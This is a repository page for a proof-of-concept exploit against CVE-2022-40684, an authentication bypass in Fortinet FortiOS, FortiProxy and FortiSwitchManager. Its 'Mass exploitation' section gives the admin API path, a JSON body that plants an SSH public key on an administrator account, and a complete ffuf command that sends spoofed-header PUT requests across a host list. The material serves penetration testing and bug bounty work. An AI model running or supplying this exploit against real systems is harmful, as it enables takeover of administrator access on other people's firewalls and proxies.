# CVE-2022-40684-POC

Exploit for CVE-2022-40684 affecting Fortinet FortiOS, FortiProxy, and FortiSwitchManager

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/kljunowsky](https://github.com/kljunowsky) |
| Url      | [https://github.com/kljunowsky/CVE-2022-40684-POC](https://github.com/kljunowsky/CVE-2022-40684-POC)                                               |
| Stars    | 14                                                          |
| License  | MIT License                                                        |

<details>

<summary>Topic / Tags</summary>

* authentication-bypass* bugbounty* cve-2022-40684* exploit* fortios* fortiproxy* penetration-testing* poc* security

</details>

## Readme

# CVE-2022-40684-POC
FortiProxy / FortiOS Authentication bypass

## Mass exploitation

```/api/v2/cmdb/system/admin/<username>```


```{"ssh-public-key1": "<your-id_rsa.pub>"}```

```
ffuf -c -w hosts.txt -u FUZZ/api/v2/cmdb/system/admin/admin -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1
]:8000";by=‚Äù[127.0.0.1]:9000";' -d '{"ssh-public-key1": "kljunowsky"}' -mr "SSH" -r
```

Happy hunting!

### Requirements
[ffuf](https://github.com/ffuf/ffuf)
Thanks [@joohoi](https://github.com/joohoi)!

[Twitter](https://twitter.com/milanshiftsec)

[LinkedIn](https://www.linkedin.com/in/milan-jovic-sec/)



## Get the content

```
git clone https://github.com/kljunowsky/CVE-2022-40684-POC
cd CVE-2022-40684-POC
```

{% embed url="https://github.com/kljunowsky/CVE-2022-40684-POC" %}

<figure><img src="https://avatars.githubusercontent.com/u/104329412?v=4" alt=""><figcaption><p>kljunowsky</p></figcaption></figure>
